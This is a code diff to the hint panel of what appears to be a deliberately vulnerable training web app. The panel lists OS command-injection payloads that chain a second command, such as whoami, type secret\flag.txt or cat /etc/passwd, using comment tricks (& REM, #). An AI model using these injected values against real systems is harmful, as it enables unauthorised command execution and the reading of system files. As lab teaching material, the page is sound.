@@ -41,19 +41,22 @@
             <div class="text-body-secondary small">
                 <h6>🐛 Command Injection Payloads:</h6>
                 <p class="mb-1"><strong>Windows - List directory:</strong></p>
-                <code class="d-block bg-dark p-2 mb-2">test & dir</code>
+                <code class="d-block bg-dark p-2 mb-2">txt & dir & REM </code>
                 
-                <p class="mb-1"><strong>Windows - Show current directory:</strong></p>
-                <code class="d-block bg-dark p-2 mb-2">test & cd</code>
+                <p class="mb-1"><strong>Windows - Show current user:</strong></p>
+                <code class="d-block bg-dark p-2 mb-2">txt & whoami & REM </code>
                 
                 <p class="mb-1"><strong>Windows - Read secret file:</strong></p>
-                <code class="d-block bg-dark p-2 mb-2">test & type secret\flag.txt</code>
+                <code class="d-block bg-dark p-2 mb-2">txt & type secret\flag.txt & REM </code>
+                
+                <p class="mb-1"><strong>Windows - System info:</strong></p>
+                <code class="d-block bg-dark p-2 mb-2">txt & hostname & REM </code>
 
                 <p class="mb-1"><strong>Unix - List files:</strong></p>
-                <code class="d-block bg-dark p-2 mb-2">test; ls -la</code>
+                <code class="d-block bg-dark p-2 mb-2">txt; ls -la #</code>
                 
                 <p class="mb-1"><strong>Unix - Read /etc/passwd:</strong></p>
-                <code class="d-block bg-dark p-2">test; cat /etc/passwd</code>
+                <code class="d-block bg-dark p-2">txt; cat /etc/passwd #</code>
             </div>
 
             <hr>
